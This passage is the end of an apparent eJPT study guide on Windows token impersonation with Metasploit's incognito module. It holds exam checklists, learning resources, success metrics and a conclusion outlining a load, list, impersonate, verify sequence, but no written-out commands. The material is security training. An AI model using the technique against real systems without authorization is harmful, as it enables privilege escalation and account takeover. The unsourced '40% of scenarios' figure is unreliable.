- [ ] Handles unexpected errors and troubleshoots effectively
- [ ] Maintains calm and methodical approach under pressure
- [ ] Produces clear, concise documentation of activities

---

## 🔗 Extended Learning Resources

### **Official Documentation and References:**
- **Metasploit Documentation:** Complete framework reference including incognito module details
- **Microsoft Security Documentation:** Understanding Windows authentication and token mechanisms
- **NIST Guidelines:** Industry-standard penetration testing methodologies

### **Hands-on Learning Platforms:**
- **INE eJPT Course:** Official preparation materials with hands-on labs
- **Cybrary:** Free cybersecurity training with Windows exploitation modules
- **PentesterLab:** Subscription-based platform with Windows privilege escalation exercises

### **Community Resources:**
- **Reddit Communities:** r/eJPT, r/AskNetsec, r/penetrationtesting
- **Discord Servers:** eJPT study groups and penetration testing communities
- **YouTube Channels:** IppSec, John Hammond, LiveOverflow for advanced techniques

### **Books and Advanced Reading:**
- **"Windows Internals" by Russinovich:** Deep understanding of Windows security mechanisms
- **"The Hacker Playbook 3" by Peter Kim:** Modern penetration testing techniques
- **"Metasploit: The Penetration Tester's Guide":** Comprehensive framework usage

### **Professional Development:**
- **eJPT Certification:** Entry-level penetration testing certification
- **eCPPT Certification:** Advanced penetration testing with Windows focus
- **OSCP Certification:** Industry-standard penetration testing certification
- **Local Security Meetups:** Network with other security professionals

---

## 🚨 Final Exam Preparation Strategy

### **Week Before Exam:**
- [ ] Complete 10 token impersonation scenarios without notes
- [ ] Practice under strict time constraints (5 minutes maximum)
- [ ] Review all common error messages and solutions
- [ ] Verify all essential commands are memorized
- [ ] Test knowledge with practice exams and scenarios

### **Day of Exam:**
- [ ] Review command syntax one final time
- [ ] Prepare mental checklist of troubleshooting steps
- [ ] Plan time allocation for each phase of assessment
- [ ] Stay calm and methodical in approach
- [ ] Document everything clearly as you progress

### **Success Metrics:**
- **Time Efficiency:** Token impersonation completed in under 5 minutes
- **Accuracy:** All commands executed correctly on first attempt  
- **Problem Solving:** Can troubleshoot issues independently
- **Documentation:** Clear evidence of privilege escalation success
- **Objective Achievement:** Mission goals completed using elevated privileges

---

## Conclusion and Key Takeaways

Token impersonation represents one of the most effective and commonly used privilege escalation techniques in Windows environments. Mastery of this technique through Metasploit's incognito module is essential for success in the eJPT exam and professional penetration testing engagements.

### **Core Concepts to Remember:**
- **Token impersonation leverages cached Windows authentication tokens** to assume other user identities
- **Incognito module provides comprehensive token manipulation capabilities** within Metasploit framework
- **Successful token impersonation often provides the highest level of system access** available
- **This technique appears in approximately 40% of eJPT Windows exploitation scenarios**

### **Critical Success Factors:**
- **Methodical approach** following the LOAD → LIST → IMPERSONATE → VERIFY sequence
- **Proper syntax usage** with correct escaping of Windows domain/username formats
- **Systematic troubleshooting** when initial attempts fail
- **Thorough verification** of privilege escalation success before proceeding

### **Professional Application:**
This technique represents real-world attack methods used by both malicious actors and security professionals. Understanding token impersonation helps security teams better defend their Windows environments while providing penetration testers with essential skills for comprehensive security assessments.

Regular practice with these techniques in controlled laboratory environments builds the expertise and confidence needed for both exam success and professional security work. The combination of theoretical understanding and hands-on practice ensures comprehensive mastery of this critical Windows exploitation technique.
